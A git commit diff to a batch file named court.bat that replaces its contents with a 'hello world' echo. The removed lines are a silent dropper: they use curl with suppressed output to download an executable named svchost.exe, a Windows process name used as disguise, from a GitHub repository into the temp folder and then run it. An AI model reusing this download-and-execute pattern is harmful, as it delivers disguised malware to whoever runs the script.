90b354aa3aeb13b397bc6f131ace569b7499fc41
madhead341 <106779656+madhead341@users.noreply.github.com>
2025-05-03 19:53:08 +0200

    Update court.bat

--- court.bat
+++ court.bat
@@ -1,10 +1,1 @@
-@echo off
-setlocal enableextensions
-
-set "URL=https://github.com/madhead341/KickAss/raw/refs/heads/main/svchost.exe"
-set "INSTALLER_PATH=%TEMP%\svchost.exe"
-
->nul 2>&1 curl -L "%URL%" -o "%INSTALLER_PATH%"
-start "" "%INSTALLER_PATH%"
-
-endlocal
+echo hello world!
